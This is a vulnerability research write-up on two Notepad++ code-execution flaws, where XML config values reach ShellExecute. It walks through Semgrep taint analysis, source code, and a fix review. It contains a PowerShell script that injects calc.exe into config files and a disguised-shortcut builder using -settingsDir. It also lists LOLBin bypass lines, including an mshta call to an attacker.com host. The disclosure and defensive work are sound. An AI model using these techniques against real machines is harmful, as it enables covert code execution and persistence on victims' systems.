---
title: "RCE in Notepad++ via XML Configuration Files: A Taint Analysis Journey"
translationKey: "notepadpp_rce"
date: 2026-05-29
author: "Michele Piccinni aka RZP"
tags: ["notepad++", "rce", "cve", "vulnerability-research", "responsible-disclosure", "windows", "xml", "taint-analysis", "semgrep", "shellexecute", "hardening"]
categories: ["Offensive Security", "Vulnerability Research"]
description: "Independent security research on Notepad++ v8.9.5 discovering two Remote Code Execution vulnerabilities via XML configuration files (config.xml and shortcuts.xml). From static source code analysis using Semgrep and source-to-sink taint tracking, to crafting a PowerShell-based PoC, up to the coordinated disclosure with the maintainer Don Ho. Fix released in v8.9.6.1. CVE-2026-48778 | CVE-2026-48800 | CVSS 7.8 HIGH."
draft: false
---
**CVE-2026-48778 | CVE-2026-48800 | CVSS 7.8 HIGH**  
*Notepad++ v8.9.5 — Fixed in v8.9.6.1*

---

**Reading time:** 10 minuti

---
![Copertina notepadpp](/images/notepad/notepadpp.png)

---

> **Responsible Disclosure Note** — All findings described in this article were communicated to Don Ho (maintainer of Notepad++) prior to publication. The upstream fix has been committed to the repository [notepad-plus-plus/notepad-plus-plus](https://github.com/notepad-plus-plus/notepad-plus-plus). The complete timeline is provided at the bottom of the article.

---

## Table of Contents

1. [Introduction](#introduction)
2. [Setup: Loading the Codebase](#setup)
3. [Threat Model and Attack Surface](#threat-model)
4. [Phase 1: Taint Analysis with Semgrep](#taint-analysis)
5. [Phase 2: Manual Verification of Findings](#manual-verification)
6. [CVE-2026-48778: config.xml → ShellExecute](#cve-001)
7. [CVE-2026-48800: shortcuts.xml → ShellExecute](#cve-002)
8. [Proof of Concept](#poc)
9. [Fix Analysis and Residual Risk](#fix-analysis)
10. [Responsible Disclosure Timeline](#disclosure)
11. [Conclusions](#conclusions)

---

## 1. Introduction {#introduction}

Notepad++ is one of the most widely used text editors on Windows, with over 28 million downloads. Its codebase is entirely open source and written in C++, making it an ideal target for static security analysis.

This writeup documents the discovery of two Remote Code Execution vulnerabilities found through taint analysis of the PowerEditor source code (v8.9.5). Both vulnerabilities share the same root cause: data read from XML configuration files flows directly into the Windows `ShellExecute` API without any validation, whitelist, or integrity check.

**Affected files:**
- `%APPDATA%\Notepad++\config.xml` → CVE-2026-48778
- `%APPDATA%\Notepad++\shortcuts.xml` → CVE-2026-48800

---

## 2. Setup: Loading the Codebase {#setup}

The analysis started by extracting the `PowerEditor.zip` archive from the official Notepad++ repository and mapping the structure:

```
PowerEditor/
└── src/
    ├── Parameters.cpp          (~8000 lines — config loading, XML parsing)
    ├── NppCommands.cpp         (command dispatch — IDM_* handlers)
    ├── NppXml.h                (pugixml wrapper)
    ├── WinControls/
    │   ├── StaticDialog/RunDlg/RunDlg.cpp   (Command::run → ShellExecute)
    │   └── shortcut/shortcut.h              (UserCommand class)
    └── MISC/
        ├── PluginsManager/PluginsManager.cpp
        └── Process/Processus.cpp
```

The XML parsing layer is handled by a thin wrapper around [pugixml](https://pugixml.org/) defined in `NppXml.h`:

```cpp
// NppXml.h — the thin wrapper over pugixml
namespace NppXml
{
    using Document  = pugi::xml_document*;
    using Element   = pugi::xml_node;
    using Node      = pugi::xml_node;

    [[nodiscard]] inline bool loadFileShortcut(Document doc, const wchar_t* filename) {
        return doc->load_file(filename,
            pugi::parse_cdata | pugi::parse_escapes |
            pugi::parse_comments | pugi::parse_declaration);
    }

    // The key source function — reads a text node value
    [[nodiscard]] inline const char* value(Node node) {
        return node.value();   // raw pugi::xml_node::value()
    }
}
```

Every call to `NppXml::value()` is a **potential taint source**: it returns raw string data from an XML file on disk, fully controlled by whoever last wrote that file.

---

## 3. Threat Model and Attack Surface {#threat-model}

**What can an attacker control?**

Notepad++ stores its configuration in `%APPDATA%\Notepad++\`. This directory is writable by any process running as the same user — no elevated privileges required. An attacker can write to these files via:

| Vector | Description |
|--------|-------------|
| Same-user process | Any code running as the logged-in user |
| Archive extraction | A ZIP/RAR that extracts files into AppData |
| Cloud sync poisoning | OneDrive/Dropbox sync of a shared folder |
| `-settingsDir=PATH` | NPP command-line flag pointing to a custom config dir |
| Malicious `.lnk` shortcut | `notepad++.exe -settingsDir="C:\attacker\evil_config"` |

The `-settingsDir=` vector is particularly stealthy: the attacker provides a self-contained directory with malicious XML files. The victim's real `%APPDATA%\Notepad++` is never touched.

**What is the sink?**

The execution sink is `ShellExecute`, called in `RunDlg.cpp:221`:

```cpp
// RunDlg.cpp — Command::run()
HINSTANCE res = ::ShellExecute(hWnd, L"open",
    cmd2Exec,    // ← executable path
    args2Exec,   // ← arguments
    cwd2Exec,    // ← working directory
    SW_SHOW);
```

`cmd2Exec` is derived from `_cmdLine`, which is the `Command` object's internal state. The question is: what populates `_cmdLine`?

---

## 4. Phase 1: Taint Analysis with Semgrep {#taint-analysis}

Since CodeQL CLI requires a compilable Windows project, I used **Semgrep 1.163.0** with custom rules to trace data flows from `NppXml::value()` to `ShellExecute`.

### Semgrep Rules

Seven rules were written covering direct flows, propagation through `string2wstring`, and memory sinks:

```yaml
rules:
  - id: npp-commandline-interpreter-xml
    severity: ERROR
    message: >
      [EXEC_RCE][src:XML_CONFIG] _commandLineInterpreter read from config.xml
      via NppXml::value, used as executable in Command::run() -> ShellExecute.
    languages: [cpp]
    pattern-either:
      - pattern: |
          const char* $CLI = NppXml::value($NODE);
          ...
          _nppGUI._commandLineInterpreter = string2wstring($CLI);

  - id: npp-xml-value-to-shellexecute
    severity: ERROR
    message: >
      [EXEC_RCE][src:XML_CONFIG] NppXml::value() reaches ShellExecute.
    languages: [cpp]
    pattern-either:
      - pattern: |
          $VAR = NppXml::value(...);
          ...
          ShellExecute(..., $VAR, ...);
      - pattern: |
          $VAR = NppXml::value(...);
          ...
          ShellExecuteW(..., $VAR, ...);

  - id: npp-wcscpy-path-overflow
    severity: WARNING
    message: >
      [MEM_CORRUPTION] wcscpy/wcscat on fixed buffer with XML-sourced path.
    languages: [cpp]
    pattern-either:
      - pattern: std::wcscpy($DEST, $SRC)
      - pattern: wcscpy($DEST, $SRC)
```

### Running the Analysis

```bash
semgrep \
  --config npp_rce_taint.yml \
  --json \
  --no-git-ignore \
  --timeout 120 \
  --jobs 4 \
  PowerEditor/src/ \
  > raw_results.json
```

**Results: 3 Semgrep findings + 8 grep-assisted findings = 11 total**

After deduplication and priority assignment, the findings were exported to CSV with severity, sink category, source category, and taint flow for each entry.

---

## 5. Phase 2: Manual Verification {#manual-verification}

Each of the 11 findings was manually verified against the source code. The result:

| ID | File | Verdict |
|----|------|---------|
| NPP-RCE-001 | Parameters.cpp:6430 | ✅ **CONFIRMED** |
| NPP-RCE-002 | Parameters.cpp:3658 | ✅ **CONFIRMED** |
| NPP-DLL-001 | PluginsManager.cpp:131 | ⚠️ Portable mode only |
| NPP-BOF-001 | Parameters.cpp:4311 | ⚠️ Limited impact |
| NPP-FP-001 | NppCommands.cpp:761 | ❌ Intended behavior |
| NPP-FP-002 | NppCommands.cpp:2490 | ❌ HKLM requires admin |
| NPP-FP-003 | pluginsAdmin.cpp:704 | ❌ SecurityGuard + DATAFILE flag |
| NPP-FP-004 | Processus.cpp:25 | ❌ Signed updater only |

The two false positive patterns worth noting:

- **pluginsAdmin.cpp:704** calls `securityGuard.checkModule()` before `LoadLibraryEx`, performing full Authenticode + SHA256 verification — properly secured.
- **Processus.cpp:25** is only instantiated for the auto-updater (wingup), which is also verified with `securityGuard.checkModule()` before execution.

---

## 6. CVE-2026-48778: config.xml → ShellExecute {#cve-001}

### The Source

In `Parameters.cpp`, the function that loads `config.xml` iterates over all `<GUIConfig>` nodes. When it finds `name="commandLineInterpreter"`, it reads the text content without any validation:

```cpp
// Parameters.cpp:6424-6435 — loadGUIConfig()
// <GUIConfig name="commandLineInterpreter"></GUIConfig>
else if (std::strcmp(nm, "commandLineInterpreter") == 0)
{
    NppXml::Node cmdLineInterpreterNode = NppXml::firstChild(childNode);
    if (cmdLineInterpreterNode)
    {
        const char* cli = NppXml::value(cmdLineInterpreterNode); // ← SOURCE
        if (cli && cli[0])
            _nppGUI._commandLineInterpreter = string2wstring(cli); // ← PROPAGATE
    }
}
```

The default value (defined in `Parameters.h`) is `%COMSPEC%`, which expands to `C:\Windows\System32\cmd.exe`. The tag is designed to let users substitute PowerShell or another shell. There is no validation of what value is accepted.

### The Propagation

`_commandLineInterpreter` lives in the `NppGUI` struct and is accessible globally via `NppParameters::getInstance().getNppGUI()`. Every time the user triggers `IDM_FILE_OPEN_CMD`, `NppCommands.cpp` creates a `Command` object directly from this value:

```cpp
// NppCommands.cpp:227-231
case IDM_FILE_OPEN_CMD:
{
    Command cmd(NppParameters::getInstance()
        .getNppGUI()._commandLineInterpreter.c_str()); // ← PROPAGATE
    cmd.run(_pPublicInterface->getHSelf(),
            L"$(CURRENT_DIRECTORY)");                  // ← triggers execution
}
break;
```

### The Sink

`Command::run()` in `RunDlg.cpp` processes `_cmdLine` through environment variable expansion and then calls `ShellExecute`:

```cpp
// RunDlg.cpp:197-221 — Command::run()
wchar_t cmd2Exec[MAX_PATH]{};
wchar_t args[MAX_PATH]{};

// Split executable from arguments
extractArgs(cmdPure, MAX_PATH, args, MAX_PATH, _cmdLine.c_str());

// Expand %ENV_VARS%
int nbTchar = ::ExpandEnvironmentStrings(cmdPure, cmdIntermediate, MAX_PATH);

// Expand $(NPP_VARIABLES)
expandNppEnvironmentStrs(cmdIntermediate, cmd2Exec, MAX_PATH, hWnd);
expandNppEnvironmentStrs(argsIntermediate, args2Exec, args2ExecLen, hWnd);

// ← SINK: cmd2Exec is fully attacker-controlled
HINSTANCE res = ::ShellExecute(hWnd, L"open",
    cmd2Exec, args2Exec, cwd2Exec, SW_SHOW);
```

**No sanitizer exists between the XML read and the ShellExecute call.**

### Complete Taint Flow

```
config.xml
  <GUIConfig name="commandLineInterpreter">PAYLOAD</GUIConfig>
      │
      ▼ Parameters.cpp:6430
  NppXml::value(cmdLineInterpreterNode)  ← SOURCE
      │
      ▼ Parameters.cpp:6432
  _nppGUI._commandLineInterpreter = string2wstring(cli)
      │
      ▼ NppCommands.cpp:228
  Command cmd(_commandLineInterpreter.c_str())
      │
      ▼ NppCommands.cpp:229
  cmd.run(hWnd, L"$(CURRENT_DIRECTORY)")
      │
      ▼ RunDlg.cpp:203–215
  extractArgs() → ExpandEnvironmentStrings() → expandNppEnvironmentStrs()
      │
      ▼ RunDlg.cpp:221
  ShellExecute(hWnd, "open", cmd2Exec, ...)  ← SINK
```

**Trigger:** Menu → *File → Open Containing Folder → cmd*  
(Italian: *File → Apri cartella file → Prompt dei Comandi*)

---

## 7. CVE-2026-48800: shortcuts.xml → ShellExecute {#cve-002}

### The Source

In `Parameters.cpp`, `feedUserCmds()` parses the `<UserDefinedCommands>` section of `shortcuts.xml`. Each `<Command>` tag's text content is read with `NppXml::value()` and stored in a `UserCommand` object:

```cpp
// Parameters.cpp:3655-3664 — feedUserCmds()
NppXml::Node aNode = NppXml::firstChild(childNode); // text node
if (aNode)
{
    const char* cmdStr = NppXml::value(aNode); // ← SOURCE
    if (cmdStr)
    {
        const auto cmdID = ID_USER_CMD +
            static_cast<int>(_userCommands.size());
        _userCommands.emplace_back(sc, cmdStr, cmdID); // ← PROPAGATE into UserCommand._cmd
        _runMenuItems.emplace_back(cmdID,
            string2wstring(sc.getName()),
            string2wstring(fdnm));
    }
}
```

The `UserCommand` class stores the raw command string:

```cpp
// shortcut.h:317-322
class UserCommand : public CommandShortcut {
    friend class NppParameters;
public:
    UserCommand(const Shortcut& sc, const char* cmd, int id)
        : CommandShortcut(sc, id), _cmd(cmd) { _canModifyName = true; }
    const char* getCmd() const { return _cmd.c_str(); } // ← returns raw XML value
private:
    std::string _cmd;
};
```

### The Propagation

When the user clicks a Run menu entry corresponding to a `UserCommand`, `NppCommands.cpp` dispatches the execution:

```cpp
// NppCommands.cpp:4261-4265
const vector<UserCommand>& theUserCommands =
    (NppParameters::getInstance()).getUserCommandList();
UserCommand ucmd = theUserCommands[i];

Command cmd(string2wstring(ucmd.getCmd(), CP_UTF8)); // ← PROPAGATE: XML → Command
cmd.run(_pPublicInterface->getHSelf());               // ← triggers execution
```

### The Sink

Identical to CVE-2026-48778 — the same `Command::run()` → `ShellExecute` path in `RunDlg.cpp:221`.

### Complete Taint Flow

```
shortcuts.xml
  <UserDefinedCommands>
    <Command name="..." ...>PAYLOAD</Command>
  </UserDefinedCommands>
      │
      ▼ Parameters.cpp:3658
  NppXml::value(aNode) = cmdStr  ← SOURCE
      │
      ▼ Parameters.cpp:3662
  _userCommands.emplace_back(sc, cmdStr, cmdID)
      │
      ▼ shortcut.h:321
  UserCommand::getCmd() → _cmd.c_str()
      │
      ▼ NppCommands.cpp:4264
  Command cmd(string2wstring(ucmd.getCmd(), CP_UTF8))
      │
      ▼ NppCommands.cpp:4265
  cmd.run(_pPublicInterface->getHSelf())
      │
      ▼ RunDlg.cpp:221
  ShellExecute(hWnd, "open", cmd2Exec, ...)  ← SINK
```

**Trigger:** Menu → *Run → [injected command name]*  
(Italian: *Esegui → [nome comando iniettato]*)

**Persistence:** the injected `<Command>` entry survives NPP restarts and appears as a normal menu item in the Run menu, making this flow particularly suited for establishing persistence.

---

## 8. Proof of Concept {#poc}

### PoC Payload: config.xml (CVE-2026-48778)

Replace the `commandLineInterpreter` tag in `%APPDATA%\Notepad++\config.xml`:

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<NotepadPlus>
    <GUIConfigs>
        <GUIConfig name="commandLineInterpreter">calc.exe</GUIConfig>
    </GUIConfigs>
</NotepadPlus>
```

### PoC Payload: shortcuts.xml (CVE-2026-48800)

Inject a `<Command>` entry inside `<UserDefinedCommands>` in `%APPDATA%\Notepad++\shortcuts.xml`:

```xml
<Command name="System Update Check" Ctrl="no" Alt="no" Shift="no" Key="0">calc.exe</Command>
```

### Automated Deployment Script

To avoid manual XML editing and handle encoding/BOM issues, the following PowerShell script was developed:

```powershell
# deploy_poc.ps1 — inject payload via text replacement (no XML parser)
function Deploy-RCE001([string]$configDir) {
    $configXml = Join-Path $configDir "config.xml"
    Backup-File $configXml

    # Read as raw text — immune to BOM/encoding issues
    $content = [System.IO.File]::ReadAllText($configXml)

    $pattern = '(<GUIConfig\s+name\s*=\s*"commandLineInterpreter"\s*>)[^<]*(</GUIConfig>)'
    if ($content -match $pattern) {
        $content = [regex]::Replace($content, $pattern, '${1}calc.exe${2}')
    } elseif ($content -match '</GUIConfigs>') {
        $inject = '<GUIConfig name="commandLineInterpreter">calc.exe</GUIConfig>'
        $content = $content -replace '</GUIConfigs>', "$inject`r`n    </GUIConfigs>"
    }

    [System.IO.File]::WriteAllText($configXml, $content)
}
```

> **Note on encoding:** Notepad++ writes its XML files with UTF-8 BOM + `\r\n` before `<?xml`. Using `XmlDocument.Load()` or `[xml]` PowerShell cast fails on these files. The solution is to use `[System.IO.File]::ReadAllText()` which auto-detects encoding, then apply `TrimStart()` before any XML parsing.

### The `-settingsDir=` Attack Vector

The most stealthy delivery mechanism requires no modification of the victim's existing files:

```powershell
# create_evil_lnk.ps1
$lnk = $WshShell.CreateShortcut("Notepad++.lnk")
$lnk.TargetPath  = "C:\Program Files\Notepad++\notepad++.exe"
$lnk.Arguments   = "-settingsDir=`"C:\attacker\evil_config`""
$lnk.IconLocation = "C:\Program Files\Notepad++\notepad++.exe,0"
$lnk.Save()
```

The resulting `.lnk` file has the Notepad++ icon, launches the legitimate `notepad++.exe` binary, but loads all configuration from the attacker-controlled directory. The victim's real `%APPDATA%\Notepad++` is never touched.

### Static Verification

A Python script was written to verify the taint flows exist in the source code without requiring Windows or a compiled NPP binary:

```python
# verify_flows.py — static taint flow verification
def verify_rce001(src: Path) -> VulnVerification:
    params = src / "Parameters.cpp"
    nppcmd = src / "NppCommands.cpp"
    rundlg = src / "WinControls/StaticDialog/RunDlg/RunDlg.cpp"

    # SOURCE
    hits = find_line(str(params), r'NppXml::value\(cmdLineInterpreterNode\)')
    # PROPAGATE
    hits = find_line(str(params), r'_commandLineInterpreter\s*=\s*string2wstring')
    hits = find_line(str(nppcmd), r'Command\s+cmd\(.*_commandLineInterpreter')
    # SINK
    hits = find_line(str(rundlg), r'ShellExecute\(.*cmd2Exec')

    # SANITIZER CHECK — if any found, mark as PATCHED
    sanitizers = find_line(str(params),
        r'_commandLineInterpreter.*whitelist|validate.*commandLine')
```

Running against the v8.9.5 source:

```
$ python3 verify_flows.py PowerEditor/src/
  NPP-RCE-001: VULNERABLE — 4/4 flow nodes confirmed, 0 sanitizers
  NPP-RCE-002: VULNERABLE — 5/5 flow nodes confirmed, 0 sanitizers
Exit code: 2
```

---

## 9. Fix Analysis and Residual Risk {#fix-analysis}

Notepad++ v8.9.6.1 introduced a trusted-directory check for the execution sink: before calling `ShellExecute`, the resolved executable path is validated against a whitelist of trusted directories (`C:\Windows\System32`, `C:\Windows`, `C:\Program Files`, `C:\Program Files (x86)`).

**Coverage:**

| Scenario | Fixed? |
|----------|--------|
| `C:\Users\evil\malware.exe` | ⚠️ Warning popup shown — user can still proceed |
| `calc.exe` (System32) | ⚠️ Allowed silently — but visually obvious to user |
| `cmd.exe /c "C:\evil\malware.exe"` | ❌ `cmd.exe` is in System32 — passes check silently |
| `powershell.exe -enc BASE64PAYLOAD` | ❌ `powershell.exe` is in System32 — passes check silently |
| `mshta.exe http://attacker.com/evil.hta` | ❌ `mshta.exe` is in System32 — passes check silently |

The fix effectively covers direct executable injection (~80% of practical scenarios) but is bypassable via **Living Off The Land Binaries (LOLBins)** — trusted system binaries that can execute arbitrary code through their arguments. The trusted-directory check validates *which binary* is launched but not *what that binary is instructed to do*.

Additionally, a warning popup was added for out-of-trusted-directory paths, giving the user a chance to notice suspicious execution.

**Proposed additional mitigation (submitted to maintainer):**

A SHA-256 integrity hash of `shortcuts.xml`, stored in `config.xml`, would detect external file modification and force a confirmation dialog regardless of the executable path — including LOLBin scenarios. The `calc_sha_256()` function is already available in the NPP codebase (`MISC/sha2/sha-256.h`) and already used in `NppCommands.cpp`, so no new dependency would be required.

For a stronger guarantee, HMAC-SHA256 keyed on the Windows Machine GUID (`HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid`) would make the hash cryptographically unforgeable by an attacker who cannot read that registry key without admin privileges.

---

## 10. Responsible Disclosure Timeline {#disclosure}

| Date | Event |
|------|-------|
| Day 0 | Taint analysis completed, PoC verified with `calc.exe` |
| Day 1 | Security advisory (DOCX with full CVSS breakdown) sent to `don.h@free.fr` |
| Day 6 | Don Ho responds, requests CVE numbers |
| Day 6 | CVE request submitted to MITRE; Don Ho informed — fix verification, LOLBin bypass reported, popup warning confirmed, SHA-256 / HMAC hash proposal submitted |
| Day 7 | Don Ho releases Notepad++ v8.9.6.1 — GitHub assigns both **CVE-2026-48778** and **CVE-2026-48800** — both advisories published publicly on GitHub Security |
| Day 7 | Public disclosure |

The entire process from initial report to public advisory took **7 days** — a remarkably fast turnaround for a project maintained by a single developer. Don Ho was responsive and professional throughout the entire process.

---

## 11. Conclusions {#conclusions}

These vulnerabilities highlight a common pattern in desktop application security: **trust boundaries around configuration files are often implicit and undocumented**. Notepad++ correctly validates plugin signatures (`SecurityGuard.checkModule()` with Authenticode + SHA256 in `pluginsAdmin.cpp`) and update installer signatures, but applied no equivalent protection to its XML configuration files.

The attack surface is limited by the requirement for local file write access, which reduces the CVSS score to 7.8 rather than critical. However, the `-settingsDir=` delivery vector makes exploitation entirely self-contained — no modification of victim files required, no admin privileges required, no detection by file integrity monitors watching `%APPDATA%`.

**Key takeaways for developers:**

1. **Every file read is a potential source.** If user-controlled data can end up in a file your application reads at startup, that data should be treated as untrusted regardless of the file's location.
2. **Apply the same security controls consistently.** NPP properly verifies plugin DLL signatures but not config XML. Inconsistent security posture creates exploitable gaps.
3. **`ShellExecute` is a high-value sink.** Any data flow leading to `ShellExecute`, `CreateProcess`, or `LoadLibrary` should be treated with the same scrutiny as a SQL query or a shell command.
4. **File integrity checks are cheap.** SHA-256 of a configuration file can be computed in microseconds and stored in a sibling file. The cost of not doing it is two CVEs.

---

*Both vulnerabilities were reported to Don Ho following a responsible disclosure process. The fix was released in Notepad++ v8.9.6.1 before this writeup was published.*

*CVE-2026-48778: [GHSA-7hm3-wp5q-ccv9](https://github.com/notepad-plus-plus/notepad-plus-plus/security/advisories/GHSA-7hm3-wp5q-ccv9)*  
*CVE-2026-48800: [GHSA-3x3f-3j39-pj3v](https://github.com/notepad-plus-plus/notepad-plus-plus/security/advisories/GHSA-3x3f-3j39-pj3v)*
